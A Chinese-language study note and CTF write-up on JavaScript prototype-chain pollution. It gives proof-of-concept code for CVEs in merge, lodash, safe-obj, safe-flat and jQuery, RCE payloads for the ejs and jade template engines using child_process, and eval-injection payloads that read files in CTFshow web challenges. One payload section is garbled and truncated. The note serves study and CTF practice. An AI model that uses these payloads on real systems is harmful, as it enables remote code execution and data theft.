        var string = str.split(separator);
        console.log(string);
    }
    // Initialize string
    var str = "GeeksforGeeks/A/computer/science/portal";
    var separator = "/";
    // Function call
    splitStr(str, separator);
    Output:
    [ 'GeeksforGeeks', 'A', 'computer', 'science', 'portal' ]
###### Array.prototype.filter()
​ **`filter()`** ​​ 方法会建立一个经指定之函式运算后，由原阵列中通过该函式检验之元素所构成的新阵列。
    const words = ['spray', 'limit', 'elite', 'exuberant', 'destruction', 'present'];
    const result = words.filter(word => word.length > 6);
    console.log(result);
    // expected output: Array ["exuberant", "destruction", "present"]
相当于一个 过滤器
###### Array.prototype.slice()
​ **`slice()`** ​​ 方法会回传一个新阵列物件，为原阵列选择之 `begin`​​ 至 `end`​​（不含
`end`​​）部分的浅拷贝（shallow copy）。而原本的阵列将不会被修改。
    const animals = ['ant', 'bison', 'camel', 'duck', 'elephant'];
    console.log(animals.slice(2));
    // expected output: Array ["camel", "duck", "elephant"]
    console.log(animals.slice(2, 4));
    // expected output: Array ["camel", "duck"]
    console.log(animals.slice(1, 5));
    // expected output: Array ["bison", "camel", "duck", "elephant"]
    console.log(animals.slice(-2));
    // expected output: Array ["duck", "elephant"]
    console.log(animals.slice(2, -1));
    // expected output: Array ["camel", "duck"]
    console.log(animals.slice());
    // expected output: Array ["ant", "bison", "camel", "duck", "elephant"]
这是相当于一个数组切割的工具
###### Array.prototype.join()
join() 方法会将阵列（或一个类阵列（array-like）物件）中所有的元素连接、合并成一个字串，并回传此字串。
    const elements = ['Fire', 'Air', 'Water'];
    console.log(elements.join());
    // expected output: "Fire,Air,Water"
    console.log(elements.join(''));
    // expected output: "FireAirWater"
    console.log(elements.join('-'));
    // expected output: "Fire-Air-Water"
#### Merge类操作导致原型链污染
原型链污染的主要思想 实际上就是寻找能够操纵键值的位置 然后利用 **proto** 来向上污染
    const merge = (a, b) => {    // 发现 merge 危险操作
      for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
          merge(a[attr], b[attr]);
        } else {
          a[attr] = b[attr];
        }
      }
      return a
    }
    const clone = (a) => {
      return merge({}, a);
    }
在上面 我们使用了merge 进行操作 merge 方法用在merge操作 以及 clone操作中
我们可以 利用merge来合并两个 复杂的对象 用clone创建一个 和现在对象相同的对象
    function merge(target, source) {
        for (let key in source) {
            if (key in source && key in target) {
                merge(target[key], source[key])
            } else {
                target[key] = source[key]
            }
        }
    }
    let object1 = {}
    let object2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
    merge(object1, object2)
    console.log(object1.a, object1.b)
    object3 = {}
    console.log(object3.b)
merge有着合并的作用
    function merge(target, source) {
        for (let key in source) {
            if (key in source && key in target) {
                merge(target[key], source[key])
            } else {
                target[key] = source[key]
            }
        }
    }
    function clone(a) {
      return merge({}, a);
    }
    let object1 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}');
    clone(object1)
    console.log(object1.a);
    console.log(object1.b);
    object2 = {}
    console.log(object2.b)
clone 也是一样的
##### merge.recursiveMerge CVE-2020-28499
影响2.1.1以下的merge版本
    const merge = require('merge');
    const payload2 = JSON.parse('{"x": {"__proto__":{"polluted":"yes"}}}');
    let obj1 = {x: {y:1}};
    console.log("Before : " + obj1.polluted);
    merge.recursive(obj1, payload2);
    console.log("After : " + obj1.polluted);
    console.log("After : " + {}.polluted);
我们可以审计以下源码 看一下 这里merge的漏洞出现在哪里
在此处进行了修复
‍
#### lodash 模块原型链污染
lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。
##### lodash.defaultsDeep 方法 CVE-2019-10744
此漏洞影响 小于4.17.12 版本的lodash
lodash库中的 defaultsDeep函数 可能会被包含constructor的payload诱骗添加或 修改Object.prototype
最终导致污染
漏洞发现者给出的poc
    const mergeFn = require('lodash').defaultsDeep;
    const payload = '{"constructor": {"prototype": {"whoami": "Vulnerable"}}}'
    function check() {
        mergeFn({}, JSON.parse(payload));
        if (({})[`a0`] === true) {
            console.log(`Vulnerable to Prototype Pollution via ${payload}`);
        }
      }
    check();
我们加上一个输出 可以验证一下 是否收到了污染
在这里已经 污染到原型了
其实 constructor 就可以理解为 实例化出来对象的时候 会触发 于是 便可以造成污染
在修复方法中 是直接将constructor check掉了 可以进行防御
##### lodash.merge 方法 CVE-2018-3721
merge是与上面所提到的merge是相差无几的
在其中调用了baseMerge
在这里没有直接调用 查找baseMergeDeep
调用`assignMergeValue ​`​​
这是一个经过了过滤的版本 之前没有过滤的版本是在这里直接可以控制键值对
这个版本中就是 将过滤放到了baseAssignValue 不改变 **proto** 便可以进行赋值
在lodash 4.17.5之前的版本中 存在这个漏洞
##### lodash.mergeWith 方法 CVE-2018-16487
4.17.11之前的版本 存在这个漏洞
    var lodash= require('lodash');
    var payload = '{"__proto__":{"polluted":"yes"}}';
    var a = {};
    console.log("Before polluted: " + a.polluted);
    lodash.mergeWith({}, JSON.parse(payload));
    console.log("After polluted: " + a.polluted);
这个方法也是依靠 baseMerge 大致和上面的差不多
##### lodash.set 方法 以及 setWith 方法 CWE-400
    lod = require('lodash')
    lod.setWith({}, "__proto__[test]", "123")
    lod.set({}, "__proto__[test2]", "456")
    console.log(Object.prototype)
set类开始
跟进baseSet
跟进`assignValue ​`​​
跟进`baseAssignValue ​`​​
当key 不为 **proto** 时 可以触发赋值
##### lodash.zipObjectDeep 方法 CVE-2020-8203
在lodash 4.17.20之前的版本适用
poc
    const _ = require('lodash');
    _.zipObjectDeep(['__proto__.z'],[123])
    console.log(z) // 123
查看源码
跟进`baseZipObject`​
在此处利用到了 assign函数
就是可以进行 覆盖的 一个函数
在这里 我们demo中传入的值，前者给到prop，后者给到values
然后prop取其中的属性，适用values覆盖，便达到了目的
#### safe-obj 原型链污染 CVE-2021-25928
    var safeObj = require("safe-obj");
    var obj = {};
    console.log("Before : " + {}.polluted);
    safeObj.expand(obj, '__proto__.polluted', 'Yes! Its Polluted');
    console.log("After : " + {}.polluted);
从poc中 可以看出 是在safeObj的expand里面 存在漏洞 那么我们直接可以看这部分的源码
关于path的解释如下
词如其名 就是 所使用的文件的路径
在此处 先是对传入的path进行 split 在demo中就是 分为了 `[__proto__,polluted]`​​ 然后在此处
判断props的length
在此处 数组中是由 `[__proto__,polluted]`​​ 组成的 length为1 所以 **proto** 等于 thing 造成 原型链污染
注意 此处 数组中有两个元素的时候 length为1
#### safe-flat 原型链污染 CVE-2021-25927
poc
2.0.0 到 2.0.1 存在漏洞
    var safeFlat = require("safe-flat");
    console.log("Before : " + {}.polluted);
    safeFlat.unflatten({"__proto__.polluted": "Yes! Its Polluted"}, '.');
    console.log("After : " + {}.polluted);
漏洞点 如上
typeof的作用如上
isDate的作用 是判断是否为时间对象
forEach
reduce方法
#### jQuery 原型链污染 CVE-2019-11358
poc:
    var jquery = document.createElement('script');
    jquery.src = 'https://code.jquery.com/jquery-3.3.1.min.js';
    let exp = $.extend(true, {}, JSON.parse('{"__proto__": {"exploit": "fake_s0u1"}}'));
    console.log({}.exploit);
注意 在镜像库中的 jquery 都是小写的 虽然在产品名中 有大写 npm是区分大小写的
##### console.table 原型链污染 CVE-2022-21824
Node.js  {for (var a in {}) {delete Object.prototype[a];} return global.process.mainModule.constructor._load('child_process').execSync('id')}\n//"}}
#### 配合 ejs 模板引擎实现 RCE CVE-2022-29078
在Nodejs的 ejs模块引擎中 存在利用 原型污染进行rce的一个漏洞
    "outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'cat /flag\');var __tmp2"
#### 配合 jade 模板引擎实现 RCE
jade模板引擎 也可以帮助我们实现原型链污染的rce
    {"__proto__":{"compileDebug":1,"self":1,"line":"console.log(global.process.mainModule.require('child_process').execSync('calc'))"}}
### 题目
#### web 334
附件给出两个文件 在user中 有用户名和密码 为CTFSHOW 和 123456 然后再login文件中 我们发现 username在传入的时候
是会经过toUpperCase 处理的也就是会变成大写 那么我们只需要传入ctfshow即可
#### web 335
题中提示我们eval 应该是我们所传入的命令就会被执行 那么我们不妨来看一下 命令如何被执行
我们这里查了一下我们可以利用child_process去执行命令 我们这里利用的是
这样三个函数
#### web 336
跟着y4师傅学到 我们可以使用
    __filename //返回当前模块文件被解析过后的绝对路径
    __dirname //返回当前模块文件解析过后的所在文件夹的绝对路径
于是我们这里可以使用前者获得以下回显
    /app/routes/index.js
我们可以尝试着将其读取出来
    ?eval=require('fs').readFileSync('/app/routes/index.js')
这里调用的是fs文件系统 我们使用readFileSync来读取其文件 回显出该文件
    var express = require('express'); var router = express.Router(); /* GET home page. */ router.get('/', function(req, res, next) { res.type('html'); var evalstring = req.query.eval; if(typeof(evalstring)=='string' && evalstring.search(/exec|load/i)>0){ res.render('index',{ title: 'tql'}); }else{ res.render('index', { title: eval(evalstring) }); } }); module.exports = router;
我们从中可以看到exec 和 load 是被过滤掉了的 我们绕过exec 我们还可以使用spawn去执行命令 可以采用yu师傅的方法
    ?eval=require('child_process').spawnSync('cat',['fl001g.txt']).stdout
去读取 亦或者 我们可以从ssti那里学来拼接命令的方式来绕过其过滤
    eval=require('child_process')['exe'%2B'cSync']('ls').toString()
这里我们的+ 需要使用url编码 否则是出不来的 原因大概是会被解析成空格
再或者说 我们在使用fs读取的时候 我们使用readdirSync 去读取目录中的文件 我们可以得到
    /?eval=require('fs').readdirSync('.')
    回显app.js,bin,fl001g.txt,modules,node_modules,package-lock.json,package.json,public,routes,sessions,views
我们可以从中发现flag 并可以使用同种方式去读取
    ?eval=require('fs').readFileSync('fl001g.txt')
可以得到flag
#### web 337
    var express = require('express');
    var router = express.Router();
    var crypto = require('crypto');
    function md5(s) {
      return crypto.createHash('md5')
        .update(s)
        .digest('hex');
    }
    /* GET home page. */
    router.get('/', function(req, res, next) {
      res.type('html');
      var flag='xxxxxxx';
      var a = req.query.a;
      var b = req.query.b;
      if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
        res.end(flag);
      }else{
        res.render('index',{ msg: 'tql'});
      }
    });
    module.exports = router;
我们从中可以看到 一段关键的代码 熟悉的MD5 我们这里就可以使用数组绕过 来绕过MD5
#### web338
一开始在app.js中看 没什么发现 在login.js中 有发现
需要把ctfshow污染 成36dboy 便可以直接输出 flag
    {"__proto__":{"ctfshow":"36dboy"}}
#### web339
上来 再乍一看 感觉和上一个题差不多
但是 在这里传入 的值 变为了一个变量 且在上面定义了这个变量
借用羽师傅的一个demo
    function copy(object1, object2){
       for (let key in object2) {
           if (key in object2 && key in object1) {
               copy(object1[key], object2[key])
           } else {